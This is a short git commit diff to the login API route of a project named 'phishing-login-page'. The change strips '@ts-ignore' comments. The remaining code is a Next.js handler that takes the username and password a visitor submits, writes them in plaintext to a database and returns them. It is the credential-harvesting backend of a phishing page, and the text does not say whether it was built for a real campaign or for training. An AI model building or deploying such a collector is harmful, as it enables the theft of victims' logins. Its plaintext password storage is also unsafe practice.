a2131ac8a72886ee55c440bfb07a606bbd61468b
Melvin2306 <melvin.rinkleff@gmx.de>
2023-11-10 00:11:38 +0100

    if this solves the error i fucking cry

--- phishing-login-page/src/app/api/login/route.ts
+++ phishing-login-page/src/app/api/login/route.ts
@@ -1,24 +1,16 @@
-// @ts-ignore
 import { PrismaClient } from "@prisma/client";
 
-// @ts-ignore
 export async function POST(request: Request) {
-  // @ts-ignore
   const prisma = new PrismaClient();
-  // @ts-ignore
   const res = await request.json();
-  // @ts-ignore
   const username = res.username;
-  // @ts-ignore
   const password = res.password;
-  // @ts-ignore
   const user = await prisma.user.create({
     data: {
       password: password,
       username: username,
     },
   });
-  // @ts-ignore
   return new Response(JSON.stringify(user), {
     headers: { "content-type": "application/json" },
   });
